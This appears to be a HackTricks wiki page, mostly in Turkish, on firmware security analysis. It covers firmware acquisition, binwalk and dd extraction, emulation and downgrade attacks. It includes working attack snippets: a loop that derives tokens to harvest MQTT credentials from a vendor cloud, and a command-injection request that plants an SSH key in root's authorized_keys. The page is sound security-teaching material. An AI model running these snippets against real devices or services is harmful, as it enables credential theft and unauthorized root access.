# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

## **Giriş**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmware, donanım bileşenleri ile kullanıcıların etkileştiği yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru şekilde çalışmasını sağlayan temel yazılımdır. Kalıcı hafızada depolanır; cihazın güç verildiği andan itibaren önemli talimatlara erişimini sağlar ve işletim sisteminin başlatılmasına yol açar. Firmware'i incelemek ve gerektiğinde değiştirmek, güvenlik açıklarını tespit etmede kritik bir adımdır.

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamada kritik bir başlangıç adımıdır. Bu süreç şu verilerin toplanmasını içerir:

- CPU mimarisi ve çalıştırdığı işletim sistemi
- Bootloader ile ilgili ayrıntılar
- Donanım düzeni ve datasheet'ler
- Kod tabanı metrikleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişleri ve düzenleyici sertifikalar
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve tespit edilen açıklar

Bu amaçla, **open-source intelligence (OSINT)** araçları çok değerlidir; ayrıca mevcut open-source yazılım bileşenlerinin elle ve otomatik yöntemlerle incelenmesi fayda sağlar. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, potansiyel sorunları bulmak için kullanılabilecek ücretsiz static analysis imkânı sunar.

## **Firmware Elde Etme**

Firmware elde etme çeşitli yollarla gerçekleştirilebilir; her birinin kendine göre zorluğu vardır:

- **Doğrudan** kaynaktan (geliştiriciler, üreticiler)
- Sağlanan talimatlardan **building** ile oluşturma
- **Downloading** ile resmi destek sitelerinden indirme
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularını kullanma
- **cloud storage**'a doğrudan erişim, ör. [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla
- Güncellemeleri man-in-the-middle teknikleriyle intercept etme
- Cihazdan **UART**, **JTAG**, veya **PICit** gibi bağlantılar üzerinden **extracting**
- Cihaz iletişiminde güncelleme isteklerini **sniffing** ile yakalama
- **Hardcoded update endpoints**'leri belirleme ve kullanma
- Bootloader veya ağ üzerinden **dumping**
- Diğer tüm yöntemler başarısız olursa uygun donanım araçlarıyla depolama chip'ini çıkarıp okuma

## Analyzing the firmware

Now that you **have the firmware**, you need to extract information about it to know how to treat it. Different tools you can use for that:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Eğer bu araçlarla çok bir şey bulamazsanız, görüntünün **entropisini** `binwalk -E <bin>` ile kontrol edin; entropi düşükse muhtemelen şifrelenmemiştir. Entropi yüksekse, muhtemelen şifrelenmiştir (ya da bir şekilde sıkıştırılmıştır).

Ayrıca, bu araçları **firmware içinde gömülü dosyaları** çıkarmak için kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Veya dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kullanabilirsiniz.

### Dosya Sistemini Elde Etme

Önceki bahsedilen araçlarla, örneğin `binwalk -ev <bin>`, **dosya sistemini çıkarmış** olmanız gerekir.\
Binwalk genellikle bunu **dosya sistemi türü adıyla bir klasörün içinde** çıkarır; bu genellikle aşağıdakilerden biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuel Dosya Sistemi Çıkarma

Bazen binwalk'ün imzalarında **dosya sisteminin magic byte'ı** olmayabilir. Bu durumlarda, binwalk'ü kullanarak dosya sisteminin ofsetini **bulun ve ikili dosyadan sıkıştırılmış dosya sistemini carve edin** ve türüne göre dosya sistemini aşağıdaki adımları kullanarak **manuel olarak çıkarın**.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs filesystem'ini carving etmek için aşağıdaki **dd command**'ı çalıştırın.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatif olarak, aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanıldığı gibi)

`$ unsquashfs dir.squashfs`

Dosyalar daha sonra `squashfs-root` dizininde olacaktır.

- CPIO arşiv dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash içeren ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyzing Firmware

Firmware elde edildikten sonra, yapısını ve olası zayıflıklarını anlamak için onu incelemek önemlidir. Bu süreç, firmware imajından değerli verileri analiz etmek ve çıkarmak için çeşitli araçların kullanılmasını içerir.

### Initial Analysis Tools

İkili dosyanın (`<bin>` olarak anılan) ilk incelemesi için bir dizi komut verilmiştir. Bu komutlar, dosya türlerini tanımlamaya, stringleri çıkarmaya, ikili verileri analiz etmeye ve bölüm ile dosya sistemi detaylarını anlamaya yardımcı olur:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
İmajın şifreleme durumunu değerlendirmek için **entropy** `binwalk -E <bin>` ile kontrol edilir. Düşük entropy şifreleme eksikliğine işaret ederken, yüksek entropy olası şifreleme veya sıkıştırma gösterir.

**embedded files**'ı çıkarmak için, dosya incelemesi amacıyla **file-data-carving-recovery-tools** dokümantasyonu ve **binvis.io** gibi araçlar ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` kullanılarak genellikle dosya sistemi çıkarılır; çoğunlukla dosya sistemi türünün adıyla adlandırılmış bir dizine (ör. squashfs, ubifs) yerleştirilir. Ancak **binwalk** eksik magic bytes nedeniyle dosya sistemi türünü tanıyamadığında, manuel çıkarma gerekir. Bu işlem, önce `binwalk` ile dosya sisteminin offset'ini bulmayı, ardından `dd` komutu ile dosya sistemini carve etmeyi içerir:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Ardından, dosya sistemi türüne bağlı olarak (ör. squashfs, cpio, jffs2, ubifs), içeriği elle çıkarmak için farklı komutlar kullanılır.

### Filesystem Analysis

Dosya sistemi çıkarıldıktan sonra güvenlik açıklarının aranmasına başlanır. Dikkat, güvenli olmayan network daemon'larına, hardcoded kimlik bilgilerine, API uç noktalarına, update server işlevlerine, derlenmemiş koda, startup script'lerine ve çevrimdışı analiz için derlenmiş ikili dosyalara verilir.

**Önemli konumlar** ve **öğeler** incelemede şunlardır:

- **etc/shadow** ve **etc/passwd** kullanıcı kimlik bilgileri için
- **etc/ssl** içindeki SSL sertifikaları ve anahtarlar
- Olası güvenlik açıkları için yapılandırma ve betik dosyaları
- İleri analiz için gömülü ikili dosyalar
- Yaygın IoT cihaz web sunucuları ve ikili dosyalar

Dosya sistemi içinde hassas bilgiler ve güvenlik açıklarını ortaya çıkarmada birkaç araç yardımcı olur:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) hassas bilgi araması için
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kapsamlı firmware analizi için
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) statik ve dinamik analiz için

### Security Checks on Compiled Binaries

Dosya sistemi içinde bulunan hem kaynak kodu hem de derlenmiş ikili dosyalar güvenlik açıkları açısından dikkatle incelenmelidir. Unix ikili dosyaları için **checksec.sh** ve Windows ikili dosyaları için **PESecurity** gibi araçlar, sömürülebilecek korumasız ikili dosyaları tespit etmeye yardımcı olur.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Many IoT hubs fetch their per-device configuration from a cloud endpoint that looks like:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Firmware analizi sırasında <token>'ın örneğin sert kodlanmış bir gizli anahtar kullanılarak deviceId'den yerel olarak türetildiğini bulabilirsiniz, örneğin:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Bu tasarım, deviceId ve STATIC_KEY'i öğrenen herkesin URL'yi yeniden oluşturup cloud konfigürasyonunu çekmesine olanak tanır; bu genellikle düz metin MQTT kimlik bilgilerini ve konu öneklerini açığa çıkarır.

Pratik iş akışı:

1) UART boot günlüklerinden deviceId'yi çıkarın

- 3.3V bir UART adaptörünü (TX/RX/GND) bağlayın ve logları yakalayın:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URL pattern ve broker address'i yazdıran satırlara bakın, örneğin:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Firmware'den STATIC_KEY ve token algoritmasını kurtarın

- İkilileri Ghidra/radare2 içine yükleyin ve config yolunu ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
- Bash'te token türetin ve digest'i büyük harfe çevirin:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Bulut yapılandırmasını ve MQTT kimlik bilgilerini topla

- URL'i oluştur ve JSON'u curl ile çek; jq ile ayrıştırıp gizli bilgileri çıkar:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Plaintext MQTT ve zayıf topic ACLs'lerini (mevcutsa) kötüye kullanma

- Kurtarılan kimlik bilgilerini kullanarak bakım topic'lerine abone olun ve hassas olayları arayın:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Öngörülebilir cihaz ID'lerini listeleme (ölçekli, yetkilendirme ile)

- Birçok ekosistem vendor OUI/product/type baytlarını, ardından gelen ardışık bir sonek ile gömer.
- Aday ID'leri yineleyebilir, tokens türetebilir ve configs'leri programlı olarak çekebilirsiniz:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notlar
- Toplu keşif denemeden önce her zaman açık yetki alın.
- Mümkünse hedef donanımı değiştirmeden sırları kurtarmak için emülasyon veya statik analizi tercih edin.


Firmware'i emüle etme süreci, bir cihazın çalışmasının veya tek bir programın **dinamik analizine** olanak tanır. Bu yaklaşım donanım veya mimari bağımlılıkları nedeniyle zorluklarla karşılaşabilir, ancak kök dosya sistemini veya belirli ikili dosyaları mimarisi ve endianness'i eşleşen bir cihaza, örneğin Raspberry Pi'ye, ya da önceden hazırlanmış bir sanal makineye aktarmak daha fazla test yapılmasını kolaylaştırabilir.

### Bireysel İkili Dosyaların Emülasyonu

Tek bir programı incelemek için programın bayt sıralamasını (endianness) ve CPU mimarisini tespit etmek kritiktir.

#### MIPS Mimarisi Örneği

MIPS mimarisine ait bir ikiliyi emüle etmek için şu komut kullanılabilir:
```bash
file ./squashfs-root/bin/busybox
```
Ve gerekli emülasyon araçlarını yüklemek için:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

ARM ikilileri için süreç benzerdir; emülasyon için `qemu-arm` emülatörü kullanılır.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dynamic Analysis in Practice

Bu aşamada analiz için gerçek veya emüle edilmiş bir cihaz ortamı kullanılır. OS ve filesystem'e shell erişimini korumak esastır. Emülasyon donanım etkileşimlerini tam olarak taklit etmeyebilir; bu nedenle zaman zaman emülasyonun yeniden başlatılması gerekebilir. Analiz sırasında filesystem tekrar incelenmeli, açığa çıkmış webpages ve network servisleri istismar edilmeli ve bootloader zafiyetleri araştırılmalıdır. Firmware bütünlük testleri potansiyel backdoor zafiyetlerini tespit etmek için kritiktir.

## Runtime Analysis Techniques

Runtime analizi, bir process veya binary ile onun çalıştığı ortamda etkileşim kurmayı içerir; breakpoint ayarlamak ve fuzzing ile diğer teknikler yoluyla zafiyetleri tespit etmek için gdb-multiarch, Frida ve Ghidra gibi araçlar kullanılır.

## Binary Exploitation and Proof-of-Concept

Belirlenen zafiyetler için PoC geliştirmek hedef mimarinin derinlemesine anlaşılmasını ve düşük seviyeli dillerde programlama gerektirir. Gömülü sistemlerde binary runtime korumaları nadirdir; ancak mevcutsa Return Oriented Programming (ROP) gibi teknikler gerekli olabilir.

## Prepared Operating Systems for Firmware Analysis

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) provide pre-configured environments for firmware security testing, equipped with necessary tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is a distro intended to help you perform security assessment and penetration testing of Internet of Things (IoT) devices. It saves you a lot of time by providing a pre-configured environment with all the necessary tools loaded.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Bir satıcı firmware görüntüleri için kriptografik imza kontrolleri uygulasa bile, **version rollback (downgrade) protection is frequently omitted**. Eğer boot- veya recovery-loader sadece gömülü bir public key ile imzayı doğruluyor ancak flaşlanan görüntünün *version* (veya monotonik bir sayaç) değeriyle karşılaştırmıyorsa, bir saldırgan meşru şekilde hâlâ geçerli bir imzaya sahip olan **daha eski, savunmasız bir firmware'i** yükleyebilir ve böylece yamalanmış zafiyetleri yeniden ortaya çıkarabilir.

Typical attack workflow:

1. **Obtain an older signed image**
* Grab it from the vendor’s public download portal, CDN or support site.
* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Zayıf (downgraded) firmware'de `md5` parametresi herhangi bir sanitizasyon olmadan doğrudan bir shell komutuna ekleniyor; bu, rastgele komut enjeksiyonuna izin veriyor (örneğin — SSH key-based root access). Daha sonraki firmware sürümleri temel bir karakter filtresi getirdi, ancak versiyon düşürme (downgrade) korumasının olmaması bu düzeltmeyi anlamsız kılıyor.

### Mobil Uygulamalardan Firmware Çıkarma

Birçok satıcı, uygulamanın cihazı Bluetooth/Wi-Fi üzerinden güncelleyebilmesi için companion mobil uygulamalarının içine tam firmware imajlarını paketler. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi yollar altında şifrelenmemiş olarak depolanır. `apktool`, `ghidra` veya hatta basit `unzip` gibi araçlar, fiziksel donanıma dokunmadan imzalı imajları çekmenizi sağlar.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Güncelleme Mantığını Değerlendirme Kontrol Listesi

* *update endpoint*'in taşıma/authentication yeterince korunuyor mu (TLS + authentication)?
* Cihaz, flashleme öncesi **version numbers** veya **monotonic anti-rollback counter** karşılaştırması yapıyor mu?
* İmaj secure boot chain içinde doğrulanıyor mu (örn. signatures ROM code tarafından kontrol ediliyor mu)?
* Userland code ek sanity checks gerçekleştiriyor mu (örn. allowed partition map, model number)?
* *partial* veya *backup* update akışları aynı validation logic'i yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse, platform muhtemelen rollback attacks'a karşı savunmasızdır.

## Pratik için savunmasız firmware

Firmware'deki zafiyetleri keşfetme pratiği yapmak için aşağıdaki vulnerable firmware projelerini başlangıç noktası olarak kullanın.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Referanslar

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Eğitim ve Sertifika

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
